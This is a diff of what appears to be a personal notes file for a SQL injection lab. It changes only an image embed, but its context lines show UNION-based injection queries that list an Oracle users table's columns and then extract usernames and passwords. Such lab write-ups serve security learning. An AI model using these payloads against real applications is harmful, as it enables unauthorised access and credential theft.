@@ -14,4 +14,4 @@ After clicking Gifts category we need to find `Tabale name, column number, colum
 4. Now we will find column name so the query will `category=-Gifts' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name='USERS_PZJWZP'--` from this we find 3 columns `EMAIL, PASSWORD_AGAINY, USERNAME_JBQHIM`
 5. Now we will find username and password so the query will `category=-Gifts' UNION SELECT USERNAME_JBQHIM, PASSWORD_AGAINY FROM USERS_PZJWZP--`
 
-![[Sqli Lab 6.png]]
+![[Sqli Lab 6.png|1000]]
